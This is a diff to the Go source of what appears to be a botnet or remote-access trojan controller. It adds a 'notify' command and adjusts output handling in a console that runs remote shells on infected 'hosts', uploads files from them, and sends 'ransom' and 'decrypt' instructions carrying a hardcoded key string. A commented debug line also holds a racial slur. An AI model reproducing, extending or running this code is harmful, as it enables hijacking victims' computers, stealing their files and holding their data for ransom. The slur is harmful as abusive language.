@@ -4,10 +4,10 @@ import (
 	"crypto"
 	"crypto/aes"
 	"crypto/cipher"
-        "crypto/rand"
-        "crypto/rsa"
-        "crypto/sha512"
-        "encoding/base64"
+    "crypto/rand"
+    "crypto/rsa"
+    "crypto/sha512"
+    "encoding/base64"
 	"encoding/json"
 	"encoding/pem"
 	"crypto/x509"
@@ -68,6 +68,7 @@ var (
 		"upload [file path]": "Uploads file from operative to host",
 		"cufol": "Fetches current directory",
 		"cuexe": "Fetches current executeable path",
+		"notify [Title] [Message]": "Sends a notification with set Title and Message",
 		"unzip [path]": "Unzips a file",
 		"instru": "Starts executing previous instructions",
 		"operand [GLOBAL/1 or SELECT/2]": "Sets operand mode GLOBAL will instruct entire hostring while DIRECT only instructs selected hosts",
@@ -929,13 +930,15 @@ func main() {
 					continue
 				}
 
-				line_splitted := strings.Split(line, " ")
+				line_splitted := strings.Split(strings.TrimSpace(line), " ")
 				var line_instru string 
 				if len(line_splitted) > 1 {
 					line_instru = line[len(line_splitted[0]) + 1:]
+
 				} else {
 					line_instru = line[len(line_splitted[0]):]
 				}
+
 				if shellrtSel != -1 {
 					if strings.ToLower(strings.TrimSpace(line)) == "exit" {
 						shellrtSel = -1
@@ -947,13 +950,14 @@ func main() {
 						insts_marshalled, _ := json.Marshal([]string{"shell " + line})
 						out, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
 						if err != nil {
-							fmt.Println("died :(\n")
+							fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)
 							shellrtSel = -1
 							shellrt = ""
 						} else {
-							fmt.Println(string(out) + "\n")
+							fmt.Println(strings.TrimSpace(strings.Replace(string(out), "<PiTrIaXMaGGi$N$9a1n>", "", -1)) + "\n")
 						}
 					}
+
 				} else {
 					switch (line_splitted[0]) {
 					case "instru":
@@ -1116,6 +1120,15 @@ func main() {
 					case "decrypt":
 						instructions = append(instructions, line)
 
+					case "notify":
+						if len(line_splitted) < 3 {
+							fmt.Printf("%s>%s Usage: notify %s[Title] [Message]%s\n", redColor, endColor, redColor, endColor)
+							continue
+						}
+						fmt.Println(len(line_splitted), len(line_splitted) < 3)
+						instructions = append(instructions, line)
+
+
 					case "unzip":
 						if strings.TrimSpace(line_instru) == "" {
 							fmt.Printf("%s>%s Cannot have %sempty path%s to unzip\n", redColor, endColor, redColor, endColor)
@@ -1125,7 +1138,7 @@ func main() {
 
 					case "beep":
 						if len(line_splitted) != 3 {
-							fmt.Printf("%s>%s Usage: beep [Frequency in Hz] [Duration in Seconds]\n", redColor, endColor, redColor, endColor)
+							fmt.Printf("%s>%s Usage: beep %s[Frequency in Hz] [Duration in Seconds]%s\n", redColor, endColor, redColor)
 							continue
 						}
 						instructions = append(instructions, line)
@@ -1192,7 +1205,7 @@ func main() {
 							if err != nil {
 								fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)
 							} else {
-								shellrt = string(out)
+								shellrt = strings.TrimSpace(strings.Replace(string(out), "<PiTrIaXMaGGi$N$9a1n>", "", -1))
 								shellrtSel = index - 1
 								if hostring_d.OS[index - 1] == 1 {
 									fmt.Printf("\n\n%s\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n", hostring_d.OSVar[index - 1])
@@ -1312,7 +1325,7 @@ func main() {
 				if strings.HasPrefix(v, "ransom") || strings.HasPrefix(v, "decrypt"){
 					v += " HSTRSKEYf0x1337INSTruction"
 				}
-				fmt.Println(v)
+				// fmt.Println(v)
 				ninstructions = append(ninstructions, v)
 			}
 
@@ -1388,13 +1401,16 @@ func main() {
 						// } else {
 						output := strings.TrimSpace(string(out))
 						output_splitted := strings.Split(output, "<PiTrIaXMaGGi$N$9a1n>")
+//						test_out := strings.Split(output, "<PiTrIaXMaGGi$N$9a1n>>")
+
 
 						// fmt.Println(output, output_splitted)
 						for indx, output := range output_splitted {
 							if indx >= len(instructions) {
 								break
 							}
-							output = strings.TrimSpace(output)
+							
+							// output = strings.Replace(strings.TrimSpace(output), "<PiTrIaXMaGGi$N$9a1n>", "", -1)
 							
 							// fmt.Println("nigger", instructions[indx], output)
 							if strings.HasPrefix(instructions[indx], "download")  { // ################ might cause problems #################
